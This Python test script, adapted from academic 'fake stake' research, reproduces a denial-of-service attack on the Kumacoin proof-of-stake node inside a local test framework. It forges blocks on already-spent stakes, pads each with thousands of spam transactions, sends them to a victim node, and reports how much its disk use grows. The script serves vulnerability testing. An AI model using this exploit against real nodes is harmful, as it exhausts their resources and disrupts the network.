#!/usr/bin/env python3
# Copyright (c) 2019 initc3
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
#
# Original
# - https://github.com/initc3/i-cant-believe-its-not-stake
#
# Change
# - modified for testing Kumacoin with **latest** test_framework
#
# Usage
# 1. apply ``vuln_fakestake.patch`` to kumacoind
# 2. run ``python3 vuln_fakestake.py``

from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import *
from test_framework.script import *
from test_framework.mininode import *
from test_framework.blocktools import *
from test_framework.key import *
import io
import time
import subprocess

from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from test_framework import test_node


# TestNode: A peer we use to send messages to bitcoind, and store responses.
class TestP2PConn(P2PInterface):
    def __init__(self):
        super().__init__()
        self.last_sendcmpct = []
        self.block_announced = False
        # Store the hashes of blocks we've seen announced.
        # This is for synchronizing the p2p message traffic,
        # so we can eg wait until a particular block is announced.
        self.announced_blockhashes = set()

    def on_sendcmpct(self, message):
        self.last_sendcmpct.append(message)

    def on_cmpctblock(self, message):
        self.block_announced = True
        self.last_message["cmpctblock"].header_and_shortids.header.calc_sha256()
        self.announced_blockhashes.add(self.last_message["cmpctblock"].header_and_shortids.header.sha256)

    def on_headers(self, message):
        self.block_announced = True
        for x in self.last_message["headers"].headers:
            x.calc_sha256()
            self.announced_blockhashes.add(x.sha256)

    def on_inv(self, message):
        for x in self.last_message["inv"].inv:
            if x.type == 2:
                self.block_announced = True
                self.announced_blockhashes.add(x.hash)

    # Requires caller to hold mininode_lock
    def received_block_announcement(self):
        return self.block_announced

    def clear_block_announcement(self):
        with mininode_lock:
            self.block_announced = False
            self.last_message.pop("inv", None)
            self.last_message.pop("headers", None)
            self.last_message.pop("cmpctblock", None)

    def get_headers(self, locator, hashstop):
        msg = msg_getheaders()
        msg.locator.vHave = locator
        msg.hashstop = hashstop
        self.send_message(msg)

    def send_header_for_blocks(self, new_blocks):
        headers_message = msg_headers()
        headers_message.headers = [CBlockHeader(b) for b in new_blocks]
        self.send_message(headers_message)

    def request_headers_and_sync(self, locator, hashstop=0):
        self.clear_block_announcement()
        self.get_headers(locator, hashstop)
        wait_until(self.received_block_announcement, timeout=30, lock=mininode_lock)
        self.clear_block_announcement()

    # Block until a block announcement for a particular block hash is
    # received.
    def wait_for_block_announcement(self, block_hash, timeout=30):
        def received_hash():
            return block_hash in self.announced_blockhashes

        wait_until(received_hash, timeout=timeout, lock=mininode_lock)

    def send_await_disconnect(self, message, timeout=30):
        """Sends a message to the node and wait for disconnect.

        This is used when we want to send a message into the node that we expect
        will get us disconnected, eg an invalid block."""
        self.send_message(message)
        self.wait_for_disconnect(timeout)


def create_transaction(prevtx, n, sig, value, nTime, scriptPubKey=CScript()):
    tx = CTransaction()
    assert (n < len(prevtx.vout))
    tx.vin.append(CTxIn(COutPoint(prevtx.sha256, n), sig, 0xffffffff))
    tx.vout.append(CTxOut(value, scriptPubKey))
    tx.nTime = nTime
    tx.calc_sha256()
    return tx


def print_dir_size(path):
    size = subprocess.check_output(['du', '-sh', path]).split()[0].decode('utf-8')
    print("blocks directory size: " + size)


NUM_TRANSACTIONS_IN_BLOCK = 6500


class FakeStakeTest(BitcoinTestFramework):
    def create_main_block(self, hashPrevBlock, block_height):
        current_time = int(time.time())
        nTime = current_time & 0xfffffff0

        coinbase = create_coinbase(block_height + 1)
        coinbase.vout[0].nValue = 0
        coinbase.vout[0].scriptPubKey = b""
        coinbase.nTime = nTime
        coinbase.rehash()

        block = create_block(int(hashPrevBlock, 16), coinbase, nTime)
        block.nVersion = 3

        # create a new private key used for block signing.
        # solve for the block here
        parent_block_stake_modifier = int(self.node.getblock(hashPrevBlock)['modifier'], 16)

        # print("parent modifier", parent_block_stake_modifier)
        if not block.solve_stake(parent_block_stake_modifier, self.staking_prevouts):
            raise Exception("Not able to solve for any prev_outpoint")

        block.vtx.append(self.sign_single_tx(block.prevoutStake, block.nTime))
        del self.staking_prevouts[block.prevoutStake]
        log = logging.getLogger("TestFramework.mininode")

        # create spam for the block. random transactions
        for j in range(NUM_TRANSACTIONS_IN_BLOCK):
            tx = create_transaction(block.vtx[0], 0, b"1729", j, nTime, scriptPubKey=CScript([self.block_sig_key.get_pubkey(), OP_CHECKSIG]))
            block.vtx.append(tx)
        block.hashMerkleRoot = block.calc_merkle_root()

        block.rehash()
        block.sign_block(self.block_sig_key)
        return block

    def collect_prevstakeouts(self):
        self.staking_prevouts = {}
        self.bad_vout_staking_prevouts = []
        self.bad_txid_staking_prevouts = []
        self.unconfirmed_staking_prevouts = []
        tx_block_time = int(time.time())
        COINBASE_MATURITY = 10
        for unspent in self.node.listunspent():
            if unspent['confirmations'] > COINBASE_MATURITY:
                self.staking_prevouts[(COutPoint(int(unspent['txid'], 16), unspent['vout']))] = (
                    int(unspent['amount']) * COIN, tx_block_time)

            if unspent['confirmations'] < COINBASE_MATURITY:
                self.unconfirmed_staking_prevouts.append((COutPoint(int(unspent['txid'], 16), unspent['vout']),
                                                          int(unspent['amount']) * COIN, tx_block_time))

    def sign_single_tx(self, prev_outpoint, nTime):

        self.block_sig_key = CECKey()
        self.block_sig_key.set_secretbytes(hash256(struct.pack('<I', 0xffff)))
        pubkey = self.block_sig_key.get_pubkey()
        scriptPubKey = CScript([pubkey, OP_CHECKSIG])
        outNValue = 3

        stake_tx_unsigned = CTransaction()
        stake_tx_unsigned.nTime = nTime
        stake_tx_unsigned.vin.append(CTxIn(prev_outpoint))
        stake_tx_unsigned.vout.append(CTxOut())
        stake_tx_unsigned.vout.append(CTxOut(int(outNValue * COIN), scriptPubKey))
        stake_tx_unsigned.vout.append(CTxOut(int(outNValue * COIN), scriptPubKey))

        stake_tx_signed_raw_hex = self.node.signrawtransaction(bytes_to_hex_str(stake_tx_unsigned.serialize_without_witness()))['hex']
        # print(stake_tx_signed_raw_hex)
        f = io.BytesIO(hex_str_to_bytes(stake_tx_signed_raw_hex))
        # print(f)
        stake_tx_signed = CTransaction()
        # print("init",stake_tx_signed)
        stake_tx_signed.deserialize(f)
        return stake_tx_signed

    # Spend all current unspent outputs. Note that we will use these for staking transactions
    def spend_tx(self):
        for unspent in self.node.listunspent():
            try:
                inputs = [{"txid": unspent["txid"], "vout": unspent["vout"]}]
                outputs = {}
                for i in range(0, 10):
                    outputs[self.node.getnewaddress()] = 0.39
                tx2 = self.node.createrawtransaction(inputs, outputs)
                tx2_signed = self.node.signrawtransaction(tx2)["hex"]
                txid_2 = self.node.sendrawtransaction(tx2_signed)
            except:
                pass

    def set_test_params(self):
        self.setup_clean_chain = True
        self.num_nodes = 1
        self.extra_args = [['-staking=1', '-debug=1']] * self.num_nodes

        self.node = None  # type: test_node
        self.staking_prevouts = {}

    def setup_network(self):
        # Can't rely on syncing all the nodes when staking=1
        self.setup_nodes()
        for i in range(self.num_nodes - 1):
            for j in range(i + 1, self.num_nodes):
                connect_nodes_bi(self.nodes, i, j)

    def run_test(self):
        # Setup the p2p connections and start up the network thread.
        victim = self.nodes[0].add_p2p_connection(TestP2PConn())

        logging.getLogger("TestFramework.mininode").setLevel(logging.ERROR)
        # NetworkThread().start()  # Start up network handling in another thread

        self.node = self.nodes[0]

        FORK_DEPTH = 2  # Depth at which we are creating a fork. We are mining

        # 1) Starting mining blocks
        self.node.setgenerate(True, 1)

        block_count = 0
        print("Mining blocks..\n")
        while block_count <= 100:
            block_count = self.node.getblockcount()
            print('Mined BlockCount:', block_count, "blocks")
            time.sleep(1)

        # 2) Stop mining, collect the possible prevouts and spend them
        self.node.setgenerate(False)
        self.collect_prevstakeouts()
        print("Collecting all unspent coins which we generated from mining..\n")
        time.sleep(2)
        self.spend_tx()
        print("Spending all the coins which we generated from mining..\n")
        # 3) Start mining again so that spent prevouts get confirmted in a block.
        self.node.setgenerate(True, 1)
        print("Waiting 10 seconds to mine blocks to confirm the transactions which we spent..\n")
        time.sleep(10)
        self.node.setgenerate(False)
        print("Sleeping 20 sec. Now mining PoS blocks based on already spent transactions..\n")
        time.sleep(20)

        print("Sending blocks with already spent PoS coinstake transactions..\n")

        block_count = self.node.getblockcount()

        pastBlockHash = self.node.getblockhash(block_count - FORK_DEPTH - 1)

        print("\n\nInitial size of data dir")
        print_dir_size(self.node.datadir + '/testnet2/blk0001.dat')
        MAX_BLOCKS = 50
        for i in range(0, MAX_BLOCKS):
            if i % 5 == 0:
                print("Sent ", i, "blocks out of", MAX_BLOCKS)
            height = block_count - FORK_DEPTH - 1
            block = self.create_main_block(pastBlockHash, height)
            # print(bytes(block.serialize()).hex())
            msg = msg_block(block)
            # logging.getLogger("TestFramework.mininode").info(str(msg))
            victim.send_message(msg)
            # In each iteration, send a `headers` message with the maximumal number of entries
        print("Sent ", MAX_BLOCKS, "blocks out of", MAX_BLOCKS)
        time.sleep(2)
        print("\n\nFinal size of data dir")
        print_dir_size(self.node.datadir + '/testnet2/blk0001.dat')


if __name__ == '__main__':
    FakeStakeTest().main()
